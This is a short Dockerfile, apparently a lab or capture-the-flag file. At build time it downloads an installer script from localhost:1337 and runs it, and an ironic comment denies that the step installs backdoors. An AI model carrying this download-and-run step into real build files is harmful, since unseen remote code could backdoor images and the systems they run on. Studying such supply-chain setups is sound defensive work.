FROM debian:buster-slim

# Copying basic files
COPY my_wrapper-script.sh /my_wrapper_script.sh

# For security reasons we check for newer versions of the installer during docker build time (definitly not changing the wrapper or installing backdoors)
ADD http://localhost:1337/script/installer.sh /tmp/installer.sh
RUN chmod +x /tmp/installer.sh; /bin/sh /tmp/installer.sh

CMD /my_wrapper-script.sh
